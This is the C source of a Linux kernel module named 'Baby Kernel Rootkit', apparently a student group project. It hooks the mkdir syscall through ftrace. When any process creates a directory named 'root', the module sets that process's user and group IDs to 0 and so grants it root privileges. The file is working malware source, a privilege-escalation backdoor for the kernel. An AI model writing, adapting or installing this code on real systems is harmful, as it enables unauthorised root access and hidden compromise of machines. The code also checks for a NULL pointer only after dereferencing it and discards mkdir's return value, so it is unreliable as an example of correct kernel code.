#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("Group 10");
MODULE_DESCRIPTION("Baby Kernel Rootkit");
MODULE_VERSION("1.0.0");

#include "hook.h"

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    printk(KERN_ALERT "??NULL ==> %d", root->uid.val);
    if (root == NULL){
        printk(KERN_ALERT "??NULL ==> %d", root->uid.val);
        return;
    }
        

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    printk(KERN_ALERT "Done");
    
    commit_creds(root);
    root = prepare_creds();
    printk(KERN_ALERT "Now ??NULL ==> %d", root->uid.val);
}

static asmlinkage long (*orig_mkdir)(const struct pt_regs *);

asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: Hook mkdir success.\n");
    
    if(strcmp(dir_name, "root") == 0)
    {
        set_root();
        printk(KERN_INFO "rootkit: Got root.\n");
    } else {
        orig_mkdir(regs);
    }

    return 0;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
};


static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded.\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);